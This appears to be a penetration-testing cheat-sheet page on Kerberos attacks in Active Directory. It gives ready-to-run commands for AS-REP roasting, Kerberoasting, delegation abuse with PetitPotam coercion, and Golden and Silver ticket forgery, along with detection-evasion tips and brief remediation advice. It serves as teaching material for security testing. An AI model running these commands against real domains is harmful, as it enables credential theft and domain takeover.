---
tags:
  - Network
  - Windows
---

# :material-ticket-account: Kerberos Attacks

<span class="pill pill-hard">high value</span> <span class="pill pill-info">windows</span>

Kerberos (port 88) is AD's authentication protocol. Its design leaves several openings: you can request crackable tickets, forge tickets outright, and abuse delegation to impersonate anyone.

!!! abstract "TL;DR"
    No creds? **AS-REP roast**. Any creds? **Kerberoast** service accounts and crack offline. Own an account with delegation? **Impersonate**. Own the KRBTGT hash? **Golden Ticket** = domain forever.

## :material-clock-alert: AS-REP Roasting

<span class="pill pill-easy">no creds needed</span>

Targets accounts with *"Do not require Kerberos preauthentication"* — the DC hands you an encrypted blob you can crack offline.

```bash
# With a user list (from RID cycling), no password required
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass
# With creds, find all vulnerable accounts
nxc ldap DC01 -u bob -p Pass --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

## :material-fire: Kerberoasting

<span class="pill pill-medium">any domain creds</span>

Any authenticated user can request service tickets (TGS) for accounts with an SPN. The ticket is encrypted with the service account's NT hash → crack it offline.

```bash
GetUserSPNs.py corp.local/bob:Pass -dc-ip 10.10.10.5 -request
nxc ldap DC01 -u bob -p Pass --kerberoasting kerb.txt

hashcat -m 13100 kerb.txt rockyou.txt
```

!!! loot "Service accounts are often over-privileged"
    SQL/service accounts are frequently Domain Admins with weak, rarely-rotated passwords — the whole point of Kerberoasting. Prioritize SPNs on accounts in privileged groups.

!!! opsec "Roasting requests are logged"
    Mass TGS requests trigger **Event ID 4769**. Request specific SPNs rather than the whole domain, and prefer RC4 (`etype 23`) targets which crack faster but stand out — balance speed vs. noise.

## :material-account-arrow-right: Delegation abuse

=== "Unconstrained"

    A host trusted for unconstrained delegation caches the TGT of anyone who connects. Coerce a DC to connect (PetitPotam/printerbug) → capture its TGT → DCSync.
    ```bash
    # On the compromised delegation host, monitor for tickets:
    Rubeus.exe monitor /interval:5
    # Coerce the DC to authenticate to you:
    petitpotam.py -u bob -p Pass ATTACKER_HOST DC01
    ```

=== "Constrained (S4U)"

    Account with `msDS-AllowedToDelegateTo` can impersonate users to specific services.
    ```bash
    getST.py -spn cifs/target.corp.local -impersonate Administrator \
      corp.local/svc:Pass -dc-ip 10.10.10.5
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass target.corp.local
    ```

=== "Resource-based (RBCD)"

    If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (via ACL abuse), you can impersonate any user to it.
    ```bash
    # 1) create a computer account (default MachineAccountQuota=10)
    addcomputer.py -computer-name EVIL$ -computer-pass Pass corp.local/bob:Pass
    # 2) set RBCD on the target to trust EVIL$
    rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write corp.local/bob:Pass
    # 3) impersonate
    getST.py -spn cifs/target -impersonate Administrator corp.local/EVIL$:Pass
    ```

## :material-crown: Ticket forgery

!!! loot "Golden Ticket (need KRBTGT hash)"
    Forge a TGT for *any* user — total, persistent domain compromise.
    ```bash
    ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> \
      -domain corp.local Administrator
    export KRB5CCNAME=Administrator.ccache; psexec.py -k -no-pass DC01
    ```

!!! loot "Silver Ticket (need a service account hash)"
    Forge a TGS for one service (CIFS, HTTP, MSSQL…) — stealthier, no DC contact.
    ```bash
    ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain corp.local \
      -spn cifs/target.corp.local Administrator
    ```

## :material-clock: Pass-the-Ticket & timing

```bash
# Reuse a .ccache / .kirbi ticket
export KRB5CCNAME=/path/ticket.ccache
klist                                  # confirm
# Fix clock skew (Kerberos requires <5 min drift)
sudo ntpdate 10.10.10.5   # or: faketime, rdate
```

## :material-alert-decagram: Edge cases & gotchas

!!! bug "The three things that break Kerberos from Linux"
    Almost every "it just won't work" moment is one of these:

    1. **Clock skew** — `KRB_AP_ERR_SKEW` means >5 min drift from the DC. Sync to
       the *DC*, not `pool.ntp.org`: `sudo ntpdate <DC-IP>` (or `faketime` /
       `rdate -n <DC>`). On a locked-down box, `nxc … --ntp` or just retry after
       `timedatectl`.
    2. **Names, not IPs** — Kerberos authenticates *SPNs*, which are hostnames.
       `psexec.py -k dc01.corp.local` works; `-k 10.10.10.5` gives
       `KRB_AP_ERR_S_PRINCIPAL_UNKNOWN`. Add the DC + target to `/etc/hosts` and
       always use the FQDN.
    3. **Ticket format mismatch** — Impacket uses `.ccache` (`KRB5CCNAME`), Rubeus
       uses `.kirbi`. Convert with `ticketConverter.py in.kirbi out.ccache` (and
       back). Forgetting this looks like "the ticket is ignored."

=== "Encryption types (etype)"

    - Roastable hashes come as **RC4 (etype 23, `$krb5tgs$23$`)** — fast to crack —
      or **AES (17/18, `$…$18$`)** — much slower. Modern DCs may only issue AES.
    - **AS-REP/Kerberoast AES** still cracks, just budget more time; don't skip an
      account because it's AES.
    - **Golden/Silver tickets:** forge with the **AES key** (`-aesKey`) not the NT
      hash where possible — an RC4-encrypted TGT on an AES-only domain is an
      **encryption-downgrade** signal defenders hunt for (a.k.a. why "Diamond" and
      "Sapphire" tickets exist — they modify a *real* ticket instead of forging).

=== "Targeted Kerberoast"

    No SPN on your target account but you have `GenericWrite`/`GenericAll` over it?
    **Set an SPN, roast, then remove it:**
    ```bash
    targetedKerberoast.py -v -d corp.local -u bob -p Pass
    # or manually: set servicePrincipalName -> GetUserSPNs -request -> clear it
    ```

=== "Double-hop problem"

    A PtT/WinRM session can't forward its Kerberos creds to a *second* remote hop
    (no TGT in the session) — you get access denied reaching a third machine. Fixes:
    use `-k` with a fresh TGT, CredSSP, or a full S4U/RBCD chain instead of relying
    on the landed session.

!!! opsec "Downgrade & forgery are loud"
    RC4 tickets in an AES environment, TGTs with a 10-year lifetime (default
    `ticketer.py`!), and mismatched PAC timestamps all light up modern detections.
    Set a realistic `-duration`, prefer AES keys, and prefer Silver/Sapphire over
    Golden when you only need one service.

## :material-shield-check: Remediation

- Long (25+ char) managed passwords / gMSA for service accounts.
- Require preauth; monitor 4768/4769/4624 for anomalies.
- Remove unconstrained delegation; use gMSA + constrained where needed.
- Rotate KRBTGT (twice) after any suspected DC compromise.

## :material-link-variant: Related

- Needs a user list from [SMB](smb.md) RID cycling or [Recon](recon.md).
- Golden Ticket typically follows [DCSync in Active Directory](active-directory.md).
- Persistence angle → [Persistence](../privesc/persistence.md).
- Reference: [HackTricks Kerberos](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html).
